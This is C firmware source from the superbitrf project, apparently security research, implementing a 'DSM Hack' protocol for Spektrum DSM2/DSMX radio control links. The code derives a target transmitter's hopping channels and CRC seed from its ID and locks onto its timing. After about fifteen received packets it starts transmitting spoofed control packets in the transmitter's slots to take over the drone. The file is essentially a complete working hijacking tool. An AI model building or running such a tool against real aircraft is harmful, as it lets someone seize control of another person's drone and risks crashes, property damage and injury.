/*
 * This file is part of the superbitrf project.
 *
 * Copyright (C) 2018 Freek van Tienen <freek.v.tienen@gmail.com>
 *
 * This library is free software: you can redistribute it and/or modify
 * it under the terms of the GNU Lesser General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This library is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU Lesser General Public License for more details.
 *
 * You should have received a copy of the GNU Lesser General Public License
 * along with this library.  If not, see <http://www.gnu.org/licenses/>.
 */

#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include "dsm_hack.h"
#include "modules/led.h"
#include "modules/config.h"
#include "modules/timer.h"
#include "modules/ant_switch.h"
#include "modules/cyrf6936.h"
#include "modules/pprzlink.h"
#include "modules/console.h"
#include "helper/dsm.h"

/* Main protocol functions */
static void protocol_dsm_hack_init(void);
static void protocol_dsm_hack_deinit(void);
static void protocol_dsm_hack_start(void);
static void protocol_dsm_hack_stop(void);
static void protocol_dsm_hack_run(void);
static void protocol_dsm_hack_status(void);
static void protocol_dsm_hack_parse_arg(uint8_t type, uint8_t *arg, uint16_t len, uint16_t offset, uint16_t tot_len);

/* Main protocol structure */
struct protocol_t protocol_dsm_hack = {
	.name = "DSM Hack",
	.init = protocol_dsm_hack_init,
	.deinit = protocol_dsm_hack_deinit,
	.start = protocol_dsm_hack_start,
	.stop = protocol_dsm_hack_stop,
	.run = protocol_dsm_hack_run,
	.status = protocol_dsm_hack_status,
	.parse_arg = protocol_dsm_hack_parse_arg
};

/* Internal functions */
static void protocol_dsm_hack_timer(void);
static void protocol_dsm_hack_receive(bool error);
static void protocol_dsm_hack_send(bool error);
static void protocol_dsm_hack_next(void);
static void protocol_dsm_build_packet(void);

/* Internal variables */
static enum dsm_hack_status_t dsm_hack_status;		//*< The current status of the hacking */
static bool is_dsmx;															//*< Whether the target is DSMX or DSM2 */
static uint8_t txid[4];														//*< The transmitter ID to hack */
static uint8_t channels[DSM_MAX_USED_CHANNELS];		//*< The channels the TX uses */
static uint8_t chan_idx;													//*< The current channel index */
static uint8_t sop_col;														//*< Start Of Packet column number */
static uint8_t data_col;													//*< Data column number */
static uint16_t crc_seed;													//*< The current crc_seed */
static uint8_t missed_packets;										//*< The amount of missed packets since last receive */
static uint16_t succ_packets;											//*< Amount of succesfully received packets */
static bool recv_time_short;											//*< Whether to use the short AB timeing */
static uint8_t pkt_throttle;											//*< Transmitting packet throttleing to PC */
static uint16_t time_chana;												//*< The last receive time of channel A */
static uint16_t time_chanb;												//*< The last receive time of channel B */
static bool start_takeover;												//*< If we need to start taking over the drone */
static bool is_11bit;															//*< If the channels need to be encoded in 11bits */
static uint8_t transmit_packet[16];								//*< The packet to transmit */

/**
 * Configure the CYRF chip and antenna switcher
 */
static void protocol_dsm_hack_init(void) {
	uint8_t mfg_id[6];
	// Stop the timer
	timer1_stop();

	// Initialize variables
	dsm_hack_status = DSM_HACK_SYNC;
	chan_idx = 0;
	pkt_throttle = 0;
	recv_time_short = false;
	start_takeover = false;
	is_11bit = false;

#ifdef CYRF_DEV_ANT
	// Switch the antenna to the CYRF
	bool ant_state[] = CYRF_DEV_ANT;
	ant_switch(ant_state);
#endif

	// Configure the CYRF
	dsm_set_config();
	dsm_set_config_transfer();

	// Read the CYRF MFG and copy from the config
	cyrf_get_mfg_id(mfg_id);

	// Configure to accept only non empty CRC16
	cyrf_set_rx_override(CYRF_DIS_CRC0);

	// Set the callbacks
	timer1_register_callback(protocol_dsm_hack_timer);
	cyrf_register_recv_callback(protocol_dsm_hack_receive);
	cyrf_register_send_callback(protocol_dsm_hack_send);

	console_print("\r\nDSM Hack initialized 0x%02X 0x%02X 0x%02X 0x%02X", mfg_id[0], mfg_id[1], mfg_id[2], mfg_id[3]);
}

/**
 * Deinitialize the variables
 */
static void protocol_dsm_hack_deinit(void) {
	timer1_register_callback(NULL);
	cyrf_register_recv_callback(NULL);
	cyrf_register_send_callback(NULL);
	console_print("\r\nDSM Hack deinitialized");
}

/**
 * Start synchronizing with the target TX
 */
static void protocol_dsm_hack_start(void) {
	int i = 0;
	// Start to synchronize with the transmitter
	dsm_hack_status = DSM_HACK_SYNC;
	chan_idx = 0;
	pkt_throttle = 0;
	recv_time_short = false;
	start_takeover = false;
	is_11bit = false;

	// Calculate the crc_seed, sop_col and data_col based on the transmitter ID
	crc_seed = ~((txid[0] << 8) + txid[1]);
	sop_col = (txid[0] + txid[1] + txid[2] + 2) & 0x07;
	data_col = 7 - sop_col;

	// Calculate channels for DSMX
	console_print("\r\n[%d, %d] ", sop_col, data_col);
	if(is_dsmx) {
		dsm_generate_channels_dsmx(txid, channels);
		for(i = 0; i < 23; i++)
			console_print("%d, ", channels[i]);
		chan_idx = 22;
	}

	// Go to the next channel and start receiving
	protocol_dsm_hack_next();
	cyrf_start_recv();
	timer1_set(DSM_SYNC_RECV_TIME);

	console_print("\r\nDSM Hack started...");
}

/**
 * Stop all communication and thus the timer
 */
static void protocol_dsm_hack_stop(void) {
	// Stop the timer
	timer1_stop();

	// Abort the receive
	cyrf_set_mode(CYRF_MODE_SYNTH_RX, true);
	cyrf_write_register(CYRF_RX_ABORT, 0x00);
	console_print("\r\nDSM Hack stopped...");
}

/**
 * In main loop running function
 */
static void protocol_dsm_hack_run(void) {

}

/**
 * Print the status of the DSM hacker
 */
static void protocol_dsm_hack_status(void) {
	
}

/**
 * Parse arguments given to the DSM hacker
 */
static void protocol_dsm_hack_parse_arg(uint8_t type, uint8_t *arg, uint16_t len, uint16_t offset, uint16_t tot_len) {
	if(type == PROTOCOL_START) {
		if(offset != 0 || len != 7 || tot_len != 7)
			return;

		is_dsmx = arg[0];
		memcpy(txid, arg+1, 4);
		memcpy(channels, arg+5, 2);
	}
	else if(type == PROTOCOL_EXTRA) {
		if(offset != 0 || len != 2 || tot_len != 2)
			return;

		start_takeover = arg[0];
		is_11bit = arg[1];
	}
}


static void protocol_dsm_hack_timer(void) {

	switch(dsm_hack_status) {
		/* We are trying to synchronize with the transmitter */
		case DSM_HACK_SYNC:
			recv_time_short = false;
			succ_packets = 0;

			// Goto the next channel
			cyrf_abort_recv();
			protocol_dsm_hack_next();
			cyrf_start_recv();

			timer1_set(DSM_SYNC_RECV_TIME);
			break;

		/* We were trying to receive at channel A */
		case DSM_HACK_RECV_A:
			// If we missed too many packets goto synchronize again
			if(missed_packets > 3) {
				dsm_hack_status = DSM_HACK_SYNC;
				timer1_set(DSM_SYNC_RECV_TIME);
				break;
			}

			// Goto the next channel
			cyrf_abort_recv();
			protocol_dsm_hack_next();
			cyrf_start_recv();

			timer1_set(DSM_RECV_TIME_B);
			dsm_hack_status = DSM_HACK_RECV_B;
			break;

		/* We were trying to receive at channel B */
		case DSM_HACK_RECV_B:
			// If we missed too many packets goto synchronize again
			if(missed_packets > 3) {
				dsm_hack_status = DSM_HACK_SYNC;
				timer1_set(DSM_SYNC_RECV_TIME);
				break;
			}

			// Goto the next channel
			cyrf_abort_recv();
			protocol_dsm_hack_next();
			cyrf_start_recv();

			// Determine the time based on received packets
			if(recv_time_short)
				timer1_set(DSM_RECV_TIME_A_SHORT);
			else
				timer1_set(DSM_RECV_TIME_A);
			dsm_hack_status = DSM_HACK_RECV_A;
			break;

		/* We are transmitting channel A */
		case DSM_HACK_SEND_A:
			timer1_set(time_chanb+20);
			protocol_dsm_build_packet();

			cyrf_send_len(transmit_packet, 16);
			dsm_hack_status = DSM_HACK_SEND_B;
			break;

		/* We are transmitting channel B */
		case DSM_HACK_SEND_B:
			timer1_set(time_chana+20);

			cyrf_send_len(transmit_packet, 16);
			dsm_hack_status = DSM_HACK_SEND_A;
			break;

	}
}

static void protocol_dsm_hack_receive(bool error) {
	uint8_t packet_length, packet[21], rx_status;
	uint16_t timer = timer1_get_time();

	// Get the receive count, rx_status and the packet
	packet_length = cyrf_read_register(CYRF_RX_COUNT);
	rx_status = cyrf_get_rx_status();
	cyrf_recv_len(&packet[1], packet_length);

	// Since we are only waiting for packets for DSM length, ignore the rest
	if(packet_length == 16) {
		// Get the CRC
		packet[17] = cyrf_read_register(CYRF_RX_CRC_LSB);
		packet[18] = cyrf_read_register(CYRF_RX_CRC_MSB);

		// Append the channel and length data
		packet[0] = packet_length;
		packet[19] = channels[chan_idx];
		uint8_t pn_row = is_dsmx? (packet[19]-2) % 5 : packet[19] % 5;
		packet[20] = (pn_row << 4) | sop_col;

		// Abort the receive
		cyrf_set_mode(CYRF_MODE_SYNTH_RX, true);
		cyrf_write_register(CYRF_RX_ABORT, 0x00);

		// Check if the packet was for us or not
		if((packet[1] == txid[2] && packet[2] == txid[3] && is_dsmx) ||
			(((~packet[1])&0xFF) == txid[2] && ((~packet[2])&0xFF) == txid[3] && !is_dsmx)) {
			// Inverse CRC if needed
			if(error && rx_status & CYRF_BAD_CRC)
				crc_seed = ~crc_seed;

			// Go to the next channel
			protocol_dsm_hack_next();
			missed_packets = 0;

			// Reset timer correctly
			if(!error) {
				succ_packets = succ_packets < 5000? (succ_packets + 1): 5000;
				//console_print("S%d",channels[chan_idx]);

				// Start takeover
				if(succ_packets > 15) {
					cyrf_start_transmit();
					protocol_dsm_build_packet();
					//console_print("\r\nS %d %d", time_chana, time_chanb);

					if(dsm_hack_status == DSM_HACK_RECV_A) {
						dsm_hack_status = DSM_HACK_SEND_B;
						timer1_set(time_chanb);
					}
					else {
						dsm_hack_status = DSM_HACK_SEND_A;
						timer1_set(time_chana);
					}

					return;
				}

				// Set the timer to the correct values
				if(succ_packets > 1 && timer < DSM_RECV_TIME_B) {
					time_chanb = timer+60;
					dsm_hack_status = DSM_HACK_RECV_A;
					if(recv_time_short)
						timer1_set(DSM_RECV_TIME_A_SHORT);
					else
						timer1_set(DSM_RECV_TIME_A);
				} else if(succ_packets > 2 && timer < DSM_RECV_TIME_A_SHORT) {
					time_chana = timer+60;
					recv_time_short = true;
					dsm_hack_status = DSM_HACK_RECV_B;
					timer1_set(DSM_RECV_TIME_B);
				} else {
					time_chana = timer+60;
					dsm_hack_status = DSM_HACK_RECV_B;
					timer1_set(DSM_RECV_TIME_B);
				}
			} else {
				timer1_set(DSM_RECV_TIME_A);
				//console_print("E%d",channels[chan_idx]);
			}

			// Send the packet to the ground station
			pkt_throttle = (pkt_throttle + 1) % 21; // Uneven because then we receive both packets
			if(!error && pkt_throttle == 0) {
				uint8_t chip_id = 0;
				pprz_msg_send_RECV_DATA(&pprzlink.tp.trans_tx, &pprzlink.dev, 1, &chip_id, packet_length+5, packet);
				LED_TOGGLE(LED_RX);
			}
		}
	}

	// Start receiving
	cyrf_start_recv();
}

/**
 * Whenever a packet has been send
 */
static void protocol_dsm_hack_send(bool error __attribute__((unused))) {
	cyrf_start_transmit();
	protocol_dsm_hack_next();
	//console_print("S");
}

/**
 * Go to the next channel for scanning
 */
static void protocol_dsm_hack_next(void) {
	chan_idx = is_dsmx? (chan_idx + 1) % DSM_MAX_USED_CHANNELS : (chan_idx + 1) % 2;
	crc_seed = ~crc_seed;
	dsm_set_channel(channels[chan_idx], !is_dsmx, sop_col, data_col, crc_seed);
}

/**
 * Build the transmitting packet
 */
static void protocol_dsm_build_packet(void) {
	if(is_dsmx) {
		transmit_packet[0] = txid[2];
		transmit_packet[1] = txid[3];
	} else {
		transmit_packet[0] = ~txid[2];
		transmit_packet[1] = ~txid[3];
	}

	for(uint8_t i = 0; i < 7; i++) {
		uint16_t value = i << 11 | 1000;
		transmit_packet[i*2 + 2] = value >> 8;
		transmit_packet[i*2 + 3] = value & 0xFF;
	}
}